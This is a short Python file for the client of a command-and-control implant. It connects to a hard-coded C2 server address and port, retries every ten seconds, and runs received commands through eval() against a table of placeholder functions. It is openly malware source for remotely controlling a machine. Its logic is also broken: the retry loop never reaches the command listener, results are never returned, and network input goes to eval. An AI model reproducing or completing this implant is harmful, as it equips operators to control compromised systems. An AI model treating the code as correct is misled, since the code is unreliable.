import socket
import time
from commands import *

supported_commands = {'command1': command1, 'command2': command2}

def connect_to_c2(c2server):
    c2server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            c2server_socket.connect(c2server)
        except:
            print("Failed to connect to C2 server.")
        finally:
            print("Retrying C2 connection after 10 seconds...")
            time.sleep(10)
            continue

        listen_for_commands(c2server_socket)


def listen_for_commands(c2server_socket):
    while True:
        command = c2server_socket.recv(1024).decode()
        try:
            command_result = eval(command, {'__builtins__':None}, supported_commands)
        except:
            c2server_socket.sendall(b"Error: invalid command!\n")



if __name__ == "__main__":
    c2server = ('192.168.175.128', 5489)
    #connect_to_c2(c2server)
